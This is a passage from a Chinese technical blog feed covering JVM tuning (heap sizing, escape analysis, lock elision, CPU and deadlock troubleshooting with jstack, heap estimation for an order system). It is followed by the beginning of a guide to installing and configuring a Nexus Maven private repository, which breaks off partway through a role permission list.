<h2 id="8-1-调整堆大小提高吞吐量"><a href="#8-1-调整堆大小提高吞吐量" class="headerlink" title="8.1 调整堆大小提高吞吐量"></a>8.1 调整堆大小提高吞吐量</h2><ol>
<li><p>准备一个SpringBoot项目，并编写测试接口127.0.0.1:8080&#x2F;test，配置JVM参数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-Xms40m</span><br><span class="line">-Xmx40m</span><br><span class="line">-XX:SurvivorRatio=8</span><br><span class="line">-XX:MetaspaceSize=64m</span><br><span class="line">-XX:+UseParallelGC</span><br><span class="line">-XX:+PrintGCDetails</span><br><span class="line">-XX:+PrintGCDateStamps</span><br><span class="line">-Xloggc:./logs/gc-%t.log</span><br></pre></td></tr></table></figure>

<p>注意，如果是普通的Web项目（没有使用SpringBoot），不建议直接修改catalina.sh中的配置，而是在其同级目录下的setenv.sh中添加JVM配置，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export CATALINA_OPTS=&quot;$CATALINA_OPTS -Xms40m&quot;</span><br><span class="line">export CATALINA_OPTS=&quot;$CATALINA_OPTS -Xmx40m&quot;</span><br><span class="line">export CATALINA_OPTS=&quot;$CATALINA_OPTS -XX:SurvivorRatio=8&quot;</span><br><span class="line">export CATALINA_OPTS=&quot;$CATALINA_OPTS -XX:MetaspaceSize=64m&quot;</span><br><span class="line">export CATALINA_OPTS=&quot;$CATALINA_OPTS -XX:+UseParallelGC&quot;</span><br><span class="line">export CATALINA_OPTS=&quot;$CATALINA_OPTS -XX:+PrintGCDetails&quot;</span><br><span class="line">export CATALINA_OPTS=&quot;$CATALINA_OPTS -XX:+PrintGCDateStamps&quot;</span><br><span class="line">export CATALINA_OPTS=&quot;$CATALINA_OPTS -Xloggc:./logs/gc-%t.log&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>按照下图设置JMeter配置。</p>
<p><img src="/../img/Snipaste_2024-09-22_12-45-25.png"></p>
</li>
<li><p>对接口进行压力测试，分别查看在堆内存为40m和80m的情况下，聚合报告中接口吞吐量的大小变化。</p>
</li>
</ol>
<h2 id="8-2-JVM优化之JTI优化"><a href="#8-2-JVM优化之JTI优化" class="headerlink" title="8.2 JVM优化之JTI优化"></a>8.2 JVM优化之JTI优化</h2><p>逃逸分析：逃逸分析会对未发生逃逸的对象（只在方法内被调用的对象）进行优化（标量替换、栈上分配、锁消除）。JDK 6u23版本之后，默认开启逃逸分析（-XX:+DoEscapeAnalysis）。在JDK 6中实现，但并不是十分成熟，因为无法保证逃逸分析的性能消耗一定比不使用逃逸分析的消耗低。比如：经过逃逸分析之后，发现所有对象都是逃逸的，那么这个分析的过程就白白浪费了。因此，开发中能使用局部变量的，就不要在方法外定义。</p>
<h3 id="8-2-1-标量替换"><a href="#8-2-1-标量替换" class="headerlink" title="8.2.1 标量替换"></a>8.2.1 标量替换</h3><p>标量（Scalar）是指一个无法再分解成更小的数据的数据，Java中的原始数据类型就是标量。相对的，那些还可以分解的数据叫做聚合量（Aggregate），Java中的对象就是聚合量，因为他可以分解成其他聚合量和标量。<br>在JIT阶段，如果经过逃逸分析，发现一个对象不会被外界访问的话，那么经过JIT优化，就会把这个对象拆解成若干个其包含的成员变量来代替，这个过程就是标量替换。默认允许将聚合量打散分配到栈上（-XX:+EliminateAllocations），这个参数需要开启了逃逸分析才有意义，两者均默认开启。</p>
<p>结论：Java中的逃逸分析，其实优化的点就在于对栈上分配的对象进行标量替换。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhifei;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：-Xms100m -Xmx100m -XX:+DoEscapeAnalysis -XX:+PrintGCDetails -XX:+EliminateAllocations</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ScalarReplaceTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Stu</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> id;</span><br><span class="line">        <span class="keyword">public</span> String name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">alloc</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Stu</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Stu</span>();</span><br><span class="line">        stu.id = <span class="number">1</span>;</span><br><span class="line">        stu.name = <span class="string">&quot;Tom&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 标量替换后</span></span><br><span class="line"><span class="comment">//    private static void alloc() &#123;</span></span><br><span class="line"><span class="comment">//        int id = 1;</span></span><br><span class="line"><span class="comment">//        String name = &quot;Tom&quot;;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10000000</span>; i++) &#123;</span><br><span class="line">            alloc();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        System.out.println(<span class="string">&quot;花费时间：&quot;</span> + (end - start) + <span class="string">&quot;ms&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">1000000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="8-2-2-栈上分配"><a href="#8-2-2-栈上分配" class="headerlink" title="8.2.2 栈上分配"></a>8.2.2 栈上分配</h3><p>将堆分配转化为栈分配。经逃逸分析后发现，一个对象并没有逃逸出方法，那么该对象可能会被优化成栈上分配。这样就无需在堆上分配内存，也无需进行垃圾回收，栈空间随着线程的结束被回收。</p>
<h3 id="8-2-3-锁（同步）消除后"><a href="#8-2-3-锁（同步）消除后" class="headerlink" title="8.2.3 锁（同步）消除后"></a>8.2.3 锁（同步）消除后</h3><p>如果一个对象被发现只能从一个线程被访问到，那么对于这个对象的操作可以不考虑同步。在动态编译同步块的时候，JIT编译器可以借助逃逸分析来判断同步块所使用的锁对象是否只能够被一个线程访问而没有被发布到其他线程。如果没有，那么JIT编译器在编译这个同步块的时候就会取消对这部分代码的同步。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhifei;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SynchronizedTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代码中的加锁对象生命周期只在当前方法中，也即只存在当前线程栈中，不会被其他线程访问到，所以在JIT编译阶段会被优化掉（字节码不变）。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        <span class="keyword">synchronized</span> (obj) &#123;</span><br><span class="line">            System.out.println(<span class="number">123</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 锁（同步）消除后：</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="comment">//    public void test() &#123;</span></span><br><span class="line"><span class="comment">//        Object obj = new Object();</span></span><br><span class="line"><span class="comment">//        System.out.println(123);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="8-3-合理配置堆内存"><a href="#8-3-合理配置堆内存" class="headerlink" title="8.3 合理配置堆内存"></a>8.3 合理配置堆内存</h2><p>估算GC频率：Eden区大小 &#x2F; (每次读取的数据大小 * 每秒读取的次数) &#x3D; 多少秒进行一次GC 。</p>
<table>
<thead>
<tr>
<th>空间</th>
<th>JVM参数</th>
<th>占用系数</th>
</tr>
</thead>
<tbody><tr>
<td>堆</td>
<td>-Xms、-Xmx</td>
<td>FGC后老年代存活对象内存大小的3~4倍。</td>
</tr>
<tr>
<td>方法区（永久代或元空间）</td>
<td>永久代：-XX:PermSize、-XX:MaxPermSize    <br>元空间：-XX:MetaspaceSize、-XX:MaxMetaspaceSize</td>
<td>FGC后方法区使用的内存大小的1.2~1.5倍。</td>
</tr>
<tr>
<td>新生代</td>
<td>-Xmn</td>
<td>FGC后老年代存活对象内存大小的1~1.5倍。</td>
</tr>
<tr>
<td>老年代</td>
<td>通过堆大小减去新生代大小得出</td>
<td>FGC后老年代存活对象内存大小的2~3倍。</td>
</tr>
</tbody></table>
<p>以上只是设置的参考值。除此之外，还要根据GC的回收率，GC停顿耗时，内存里的实际数据来判断，FulIGC是基本上不能有的，如果有就要做内存Dump分析，然后再去做一个合理的内存分配。</p>
<p>判定老年代的存活对象大小：</p>
<ul>
<li>方法1（推荐&#x2F;稳妥）：JVM参数中添加GC日志，GC日志中会记录每次FGC之后各代的内存大小，观察FGC之后老年代的空间大小。可观察一段时间内（比如2天）的FGC之后的内存情况，根据多次FGC之后的老年代的空间大小来预估FGC之后老年代的存活对象大小（取平均值）。</li>
<li>方法2（会影响线上服务&#x2F;慎用）：<ul>
<li>方法1中需要更改JVM参数，并分析日志。同时，在使用CMS收集器时，可能不能触发FGC，导致日志中没有FGC的记录，此时则需要强制触发FGC。在强制触发前，先把服务节点摘除，FGC之后再将服务挂回可用节点，对我提供服务，在不同时间段触发FGC，预估FGC之后老年代的存活对象大小（取平均值）。</li>
<li>强制触发1：<code>jmap -dump:live,format=b,file=heap.bin &lt;pid&gt;</code> 将当前的存活对象dump到文件，会触发FGC。</li>
<li>强制触发2：<code>jmap -histo:live &lt;pid&gt;</code> 打印每个class的实例数目、内存占用、类全名信息.live子参数加上后、只统计活的对象数量，会触发FGC。</li>
<li>强制触发3：在性能测试环境，可通过Java监控工具触发FGC，比如：VisualVM、JConsole。</li>
</ul>
</li>
</ul>
<p>以如下接口为例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; LIST = <span class="keyword">new</span> <span class="title class_">ArrayList</span>() &#123;&#123;</span><br><span class="line">    add(<span class="string">&quot;ABC&quot;</span>);</span><br><span class="line">    add(<span class="string">&quot;ABC&quot;</span>);</span><br><span class="line">    add(<span class="string">&quot;ABC&quot;</span>);</span><br><span class="line">    add(<span class="string">&quot;ABC&quot;</span>);</span><br><span class="line">    add(<span class="string">&quot;ABC&quot;</span>);</span><br><span class="line">&#125;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> List&lt;String&gt; <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> LIST;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置其JVM参数，先设置较大的内存空间，逐步优化：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-Xms1024m</span><br><span class="line">-Xmx1024m</span><br><span class="line">-XX:SurvivorRatio=8</span><br><span class="line">-XX:MetaspaceSize=64m</span><br><span class="line">-XX:+UseParallelGC</span><br><span class="line">-XX:+PrintGCDetails</span><br><span class="line">-XX:+PrintGCDateStamps</span><br><span class="line">-Xloggc:./logs/gc.log</span><br></pre></td></tr></table></figure>

<p>使用“强制触发2”多次触发FGC，通过 <code>jstat -gc &lt;pid&gt; 1000 5</code> 查看GC的统计信息；通过 <code>jmap -heap &lt;pid&gt;</code> 查看堆内存使用情况，这里老年代对象大小为32.23MB、使用的元空间大小为50.47MB，即可得出优化后：堆空间 32.23 x 4 ≈ 128MB；元空间64MB &#x2F; 50.47MB ≈ 1.27（符合条件不做改动），具体如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-Xms128m</span><br><span class="line">-Xmx128m</span><br><span class="line">-XX:SurvivorRatio=8</span><br><span class="line">-XX:MetaspaceSize=64m</span><br><span class="line">-XX:+UseParallelGC</span><br><span class="line">-XX:+PrintGCDetails</span><br><span class="line">-XX:+PrintGCDateStamps</span><br><span class="line">-Xloggc:./logs/gc.log</span><br></pre></td></tr></table></figure>

<p>再进行压测，优化前后压测的汇总报告、GC统计信息：</p>
<p><img src="/../img/Snipaste_2024-10-05_17-25-59.png"></p>
<hr>
<p><img src="/../img/Snipaste_2024-10-05_18-46-03.png"></p>
<p>优化结果：YGC次数增加，整体耗时增加，但单次耗时缩短，也未出现FGC，节省了很大一块内存资源。</p>
<h2 id="8-4-CPU高占用的排查"><a href="#8-4-CPU高占用的排查" class="headerlink" title="8.4 CPU高占用的排查"></a>8.4 CPU高占用的排查</h2><p>通用步骤：</p>
<ol>
<li><p>先找到CPU占用率高的Java进程；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps aux | grep java</span><br></pre></td></tr></table></figure>
</li>
<li><p>罗列该进程下的所有线程，找到可疑线程pid；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">top -Hp &lt;进程pid&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>jstack 进程pid，并找到对应线程十六进制的pid相关的代码；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-A20表示输出其后20行；<span class="built_in">printf</span> <span class="string">&#x27;%x\n&#x27;</span> &lt;十进制&gt; 表示将10进制转16进制。</span></span><br><span class="line">jstack &lt;进程pid&gt; | grep -A20 `printf &#x27;%x\n&#x27; &lt;线程pid&gt;`</span><br></pre></td></tr></table></figure></li>
</ol>
<p>示例：</p>
<ul>
<li><p>以为死锁代码DeadLockTest.java为例，在Linux下编译并执行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeadLockTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (o1) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    TimeUnit.MILLISECONDS.sleep(<span class="number">100</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">synchronized</span> (o2) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;t1&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (o2) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    TimeUnit.MILLISECONDS.sleep(<span class="number">200</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">synchronized</span> (o1) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;t2&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>排查过程如下。</p>
<p><img src="/../img/Snipaste_2024-10-06_17-34-39.png"></p>
</li>
<li><p>死锁解决方法</p>
<ul>
<li>调整锁的顺序，保持一致。</li>
<li>采用定时锁，一定时间内获取不到锁，则释放所有自身持有的锁。</li>
</ul>
</li>
</ul>
<h2 id="8-5-G1并发线程数对性能的影响"><a href="#8-5-G1并发线程数对性能的影响" class="headerlink" title="8.5 G1并发线程数对性能的影响"></a>8.5 G1并发线程数对性能的影响</h2><p>使用G1收集器时，-XX:ConcGCThreads主要影响吞吐量，对响应时间影响不大。</p>
<h2 id="8-6-调整垃圾收集器提高吞吐量"><a href="#8-6-调整垃圾收集器提高吞吐量" class="headerlink" title="8.6 调整垃圾收集器提高吞吐量"></a>8.6 调整垃圾收集器提高吞吐量</h2><p>吞吐量（多核）：Serial &lt; Parallel &lt; G1</p>
<h2 id="8-7-日均百万订单系统JVM参数的设置"><a href="#8-7-日均百万订单系统JVM参数的设置" class="headerlink" title="8.7 日均百万订单系统JVM参数的设置"></a>8.7 日均百万订单系统JVM参数的设置</h2><ul>
<li><p>问题1.假设每天300万订单，在3个小时内产生，分析：</p>
<ul>
<li>3000000 &#x2F; 3600 &#x2F; 3 ≈ 278单&#x2F;秒，假设使用3台机器，每台机器每秒大概需要处理100单，假设每单产生1KB数据，则每台每秒产生100KB，订单会涉及其它很多业务（优惠券、库存等），数据放大20倍约2MB。也就是说，每秒大概有2MB的数据在Eden区产生。假设分配给堆4GB内存，默认情况下，Eden区能分配到 4 &#x2F; 3 * 0.8 ≈ 1.06GB（约1085MB），即1085 &#x2F; (2 * 60) ≈ 9分钟进行一次MinorGC，还能接受！此外，若业务再暴增，还可以增加机器或把新生代分配再大一点（降低GC频率，减少进入老年代的对象，从而降低FullGC频率）。</li>
</ul>
</li>
<li><p>问题2.要求响应时间控制在100ms？</p>
<ul>
<li>实际中通过压测去反复测试，分析YGC、FGC的耗时和频率等。</li>
</ul>
</li>
<li><p>问题3.如何处理百万级的并发？</p>
<ul>
<li>下订单、减库存使用中间件（消息队列）进行异步处理。</li>
</ul>
</li>
<li><p>问题4.高PV的资料类网站（磁盘文档读取到内存），升级内存前慢？升级内存后还慢？</p>
<ul>
<li>升级前慢：频繁GC，STW时间较长，响应慢！</li>
<li>升级后慢：内存空间越大，FGC时间越长！</li>
<li>解决：<ul>
<li>垃圾收集器：Parallel、ParNew + CMS、G1</li>
<li>配置参数：-XX:MaxGCPauseMillis、-XX:ConcGCThreads</li>
<li>根据GC日志和Dump文件分析，优化内存空间比例</li>
</ul>
</li>
</ul>
</li>
<li><p>问题5.系统内存飙高排查？</p>
<ul>
<li>jmap -heap、jstat等工具查看内存使用情况；</li>
<li>MAT工具分析Dump文件；</li>
<li>查看GC日志；</li>
</ul>
</li>
</ul>
<h1 id="附页"><a href="#附页" class="headerlink" title="附页"></a>附页</h1><ul>
<li>JVM参数分类<ul>
<li>标准参数：比较稳定，后续版本基本不会变化，以-开头，可以通过java -help查看所有标准选项。</li>
<li>-X参数：非标准化参数，功能比较稳定，但官方说明后续版本可能变更，以-X开头，可以通过java -X查看所有-X选项。</li>
<li>-XX参数：非标准化参数，使用最多的参数类型，属于实验性，不稳定，以-XX开头，用于开发和调试JVM。<ul>
<li><code>-XX:&lt;+|-&gt;&lt;option&gt;</code>，Boolean类型，+表示开启option属性，-表示禁用option属性。</li>
<li><code>-XX:&lt;option&gt;=&lt;number|string&gt;</code>，key-value类型，值可为数字或者字符串。</li>
</ul>
</li>
</ul>
</li>
<li><a href="https://docs.oracle.com/javase/8/docs/technotes/tools/unix/java.html">Java8文档 (oracle.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>Nexus（Maven私服）搭建</title>
    <url>/2020/11/13/Nexus%EF%BC%88Maven%E7%A7%81%E6%9C%8D%EF%BC%89%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="1-搭建"><a href="#1-搭建" class="headerlink" title="1. 搭建"></a>1. 搭建</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ~</span><br><span class="line">wget https://sonatype-download.global.ssl.fastly.net/repository/repositoryManager/3/nexus-3.15.2-01-unix.tar.gz</span><br><span class="line">tar -zxvf nexus-3.15.2-01-unix.tar.gz</span><br><span class="line">mv -f nexus-3.15.2-01 /opt</span><br><span class="line">/opt/nexus-3.15.2-01/bin/nexus start</span><br></pre></td></tr></table></figure>

<p>访问：curl <a href="http://localhost:8081/">http://localhost:8081</a></p>
<p>如要修改端口，修改&#x2F;opt&#x2F;nexus-3.15.2-01&#x2F;etc&#x2F;nexus-default.properties，再重启</p>
<h1 id="2-自启动"><a href="#2-自启动" class="headerlink" title="2. 自启动"></a>2. 自启动</h1><ul>
<li>创建软连接</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /opt/nexus-3.15.2-01/bin/nexus /usr/local/bin/</span><br></pre></td></tr></table></figure>

<ul>
<li>vim &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;nexus.service，在里面添加如下内容</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=nexus service</span><br><span class="line">After=network.target</span><br><span class="line"> </span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">LimitNOFILE=65536</span><br><span class="line">ExecStart=/opt/nexus-3.15.2-01/bin/nexus start</span><br><span class="line">ExecStop=/opt/nexus-3.15.2-01/bin/nexus stop</span><br><span class="line">User=root</span><br><span class="line">Restart=on-abort</span><br><span class="line"> </span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

<ul>
<li>再执行</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl enable nexus.service</span><br><span class="line">sudo systemctl start nexus.service</span><br></pre></td></tr></table></figure>

<h1 id="3-配置"><a href="#3-配置" class="headerlink" title="3. 配置"></a>3. 配置</h1><h2 id="3-1-maven中的settings-xml配置"><a href="#3-1-maven中的settings-xml配置" class="headerlink" title="3.1. maven中的settings.xml配置"></a>3.1. maven中的settings.xml配置</h2><p>一般情况配置第3.1.2即可</p>
<h3 id="3-1-1-配置servers属性"><a href="#3-1-1-配置servers属性" class="headerlink" title="3.1.1 配置servers属性"></a>3.1.1 配置servers属性</h3><p>假如开发的项目需要作为一个模块供给另外一个项目使用，可以通过此方式配置镜像的密码发布到nexus时需要使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;servers&gt;</span><br><span class="line">	&lt;server&gt;</span><br><span class="line">        &lt;id&gt;nexus&lt;/id&gt;</span><br><span class="line">        &lt;username&gt;admin&lt;/username&gt;</span><br><span class="line">        &lt;password&gt;admin123&lt;/password&gt;</span><br><span class="line">	&lt;/server&gt;</span><br><span class="line">&lt;/servers&gt;</span><br></pre></td></tr></table></figure>

<h3 id="3-1-2-配置mirrors属性"><a href="#3-1-2-配置mirrors属性" class="headerlink" title="3.1.2. 配置mirrors属性"></a>3.1.2. 配置mirrors属性</h3><p>这里的意思是，拦截所有仓库，并使用这里配置的url上面的仓库进行下载依赖，当这里的url无法下载依赖时，不会使用中央仓库进行依赖的下载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;mirrors&gt;</span><br><span class="line">	&lt;mirror&gt;</span><br><span class="line">		&lt;id&gt;nexus&lt;/id&gt;</span><br><span class="line">		&lt;mirrorOf&gt;*&lt;/mirrorOf&gt;</span><br><span class="line">		&lt;url&gt;http://192.168.235.130:8081/repository/maven-public/&lt;/url&gt;</span><br><span class="line">	&lt;/mirror&gt;</span><br><span class="line">&lt;/mirrors&gt;</span><br></pre></td></tr></table></figure>

<h3 id="3-1-3-配置profiles属性"><a href="#3-1-3-配置profiles属性" class="headerlink" title="3.1.3. 配置profiles属性"></a>3.1.3. 配置profiles属性</h3><p>这里对依赖的仓库以及插件的仓库进行配置，与pom中的配置类似，只不过这里是全局配置，pom里面针对的是某一个项目，联合配置3.1.4使用，如果仓库或者插件仓库的id为central（与中央仓库id一致），则会覆盖中央仓库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;profiles&gt;</span><br><span class="line">	&lt;profile&gt;</span><br><span class="line">		&lt;id&gt;nexus&lt;/id&gt;</span><br><span class="line">		&lt;repositories&gt;</span><br><span class="line">			&lt;repository&gt;</span><br><span class="line">				&lt;id&gt;central&lt;/id&gt;</span><br><span class="line">				&lt;url&gt;http://192.168.235.130:8081/repository/maven-public/&lt;/url&gt;</span><br><span class="line">				&lt;releases&gt;</span><br><span class="line">					&lt;enabled&gt;true&lt;/enabled&gt;</span><br><span class="line">				&lt;/releases&gt;</span><br><span class="line">				&lt;snapshots&gt;</span><br><span class="line">					&lt;enabled&gt;true&lt;/enabled&gt;</span><br><span class="line">				&lt;/snapshots&gt;</span><br><span class="line">			&lt;/repository&gt;</span><br><span class="line">		&lt;/repositories&gt;</span><br><span class="line">		&lt;pluginRepositories&gt;</span><br><span class="line">			&lt;pluginRepository&gt;</span><br><span class="line">				&lt;id&gt;central&lt;/id&gt;</span><br><span class="line">				&lt;url&gt;http://192.168.235.130:8081/repository/maven-public/&lt;/url&gt;</span><br><span class="line">				&lt;releases&gt;</span><br><span class="line">					&lt;enabled&gt;true&lt;/enabled&gt;</span><br><span class="line">				&lt;/releases&gt;</span><br><span class="line">				&lt;snapshots&gt;</span><br><span class="line">					&lt;enabled&gt;true&lt;/enabled&gt;</span><br><span class="line">				&lt;/snapshots&gt;</span><br><span class="line">			&lt;/pluginRepository&gt;</span><br><span class="line">		&lt;/pluginRepositories&gt;</span><br><span class="line">	&lt;/profile&gt;</span><br><span class="line">&lt;/profiles&gt;</span><br></pre></td></tr></table></figure>

<h3 id="3-1-4-配置settings属性"><a href="#3-1-4-配置settings属性" class="headerlink" title="3.1.4. 配置settings属性"></a>3.1.4. 配置settings属性</h3><p>联合配置3.1.3使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;settings&gt;</span><br><span class="line">	&lt;activeProfiles&gt;</span><br><span class="line">		&lt;activeProfile&gt;nexus&lt;/activeProfile&gt;        &lt;!--这个id和profile的id一致--&gt;</span><br><span class="line">	&lt;/activeProfiles&gt;</span><br><span class="line">&lt;/settings&gt;</span><br></pre></td></tr></table></figure>

<h2 id="3-2-工程发布到nexus配置"><a href="#3-2-工程发布到nexus配置" class="headerlink" title="3.2. 工程发布到nexus配置"></a>3.2. 工程发布到nexus配置</h2><p>配置需要发布（不用发布则不用配置）到nexus的工程的pom.xml，或者可以直接登陆nexus，在界面进行发布</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;distributionManagement&gt;</span><br><span class="line">	&lt;repository&gt;</span><br><span class="line">		&lt;id&gt;nexus&lt;/id&gt;</span><br><span class="line">		&lt;name&gt;Releases&lt;/name&gt;</span><br><span class="line">		&lt;url&gt;http://192.168.235.130:8081/repository/maven-releases/&lt;/url&gt;</span><br><span class="line">	&lt;/repository&gt;</span><br><span class="line">	&lt;snapshotRepository&gt;</span><br><span class="line">		&lt;id&gt;nexus&lt;/id&gt;</span><br><span class="line">		&lt;name&gt;Snapshot&lt;/name&gt;</span><br><span class="line">		&lt;url&gt;http://192.168.235.130:8081/repository/maven-snapshots/&lt;/url&gt;</span><br><span class="line">	&lt;/snapshotRepository&gt;</span><br><span class="line">&lt;/distributionManagement&gt;</span><br></pre></td></tr></table></figure>

<p>使用命令发布（可能存在问题）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn deploy:deploy-file -DgroupId=com.handle -DartifactId=handle-client -Dversion=1.0.0 -Dpackaging=jar -Dfile=C:\Users\He\Desktop\handle-client-9.1.0.jar -Durl=http://192.168.235.130:8081/repository/maven-releases/</span><br><span class="line">-DrepositoryId=maven-releases</span><br></pre></td></tr></table></figure>

<h1 id="4-使用"><a href="#4-使用" class="headerlink" title="4. 使用"></a>4. 使用</h1><h2 id="4-1-仓库类型"><a href="#4-1-仓库类型" class="headerlink" title="4.1. 仓库类型"></a>4.1. 仓库类型</h2><p>proxy: 代理其他仓库，例如：代理阿里的镜像仓库</p>
<p>hosted: 宿主仓库，用于发布第三方jar，例如使用maven-releases来发布第三方jar</p>
<p>group: 仓库组，包含其他仓库，例如nexus使用maven-public来包含其他仓库（maven-central&#x2F;maven-releases&#x2F;maven-snapshots&#x2F;自定义仓库），对外通常使用此仓库来下载依赖</p>
<h2 id="4-2-角色创建"><a href="#4-2-角色创建" class="headerlink" title="4.2. 角色创建"></a>4.2. 角色创建</h2><p>创建developer角色，其权限包括：</p>
<p>nx-component-upload</p>
<p>nx-repository-view-maven2-maven-releases-add</p>
<p>nx-repository-view-maven2-maven-releases-browse</p>
<p>nx-repository-view-maven2-maven-releases-edit</p>
